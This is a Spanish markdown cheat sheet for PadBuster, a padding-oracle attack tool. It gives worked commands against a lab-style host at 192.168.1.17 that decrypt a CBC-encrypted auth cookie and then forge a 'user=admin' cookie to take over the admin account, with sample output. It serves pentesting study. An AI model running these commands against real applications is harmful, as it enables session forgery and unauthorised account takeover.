# PadBuster

PadBuster es una herramienta de línea de comandos diseñada para explotar vulnerabilidades de **Padding Oracle**. Permite descifrar cookies o tokens cifrados con CBC y, una vez conocido el texto plano, forjar nuevos valores cifrados.

Para entender el ataque que esta herramienta automatiza, ver: [Padding Oracle](./Padding_Oracle.md)

---

## Sintaxis

```bash
padbuster <URL> <ValorCifrado> <TamañoBloque> [opciones]
```

| Parámetro | Descripción |
|---|---|
| `<URL>` | URL de la aplicación vulnerable |
| `<ValorCifrado>` | El token/cookie cifrado a descifrar o forjar |
| `<TamañoBloque>` | Tamaño del bloque en bytes: `8` para DES/3DES, `16` para AES |

---

## Descifrar un valor cifrado

```bash
padbuster http://192.168.1.17/index.php \
  3U45ZrgkKaW3wGiEwijfk32p72vwyKOH \
  8 \
  -cookies 'auth=3U45ZrgkKaW3wGiEwijfk32p72vwyKOH'
```

Salida esperada:
```
[+] Decrypted value (ASCII): user=bendu
[+] Decrypted value (HEX):   757365723D62656E6475060606060606
[+] Decrypted value (Base64): dXNlcj1iZW5kdQYGBgYGBg==
```

---

## Forjar un nuevo valor cifrado

Una vez conocido el formato del texto plano, se puede cifrar cualquier valor arbitrario:

```bash
padbuster http://192.168.1.17/index.php \
  3U45ZrgkKaW3wGiEwijfk32p72vwyKOH \
  8 \
  -cookies 'auth=3U45ZrgkKaW3wGiEwijfk32p72vwyKOH' \
  -plaintext 'user=admin'
```

Salida:
```
[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
```

Colocar este valor como cookie de sesión en el navegador otorgará acceso a la cuenta `admin` si existe.

---

## Opciones útiles

| Opción | Descripción |
|---|---|
| `-cookies` | Envía la cookie cifrada con cada petición |
| `-plaintext` | Texto plano a cifrar (modo forja) |
| `-encoding` | Encoding del valor cifrado: `0`=Base64, `1`=HEX, `2`=Net, `3`=Base64+, `4`=URI |
| `-error` | Cadena que aparece en respuesta con padding inválido |
| `-noiv` | Indica que no hay IV prepended al valor cifrado |
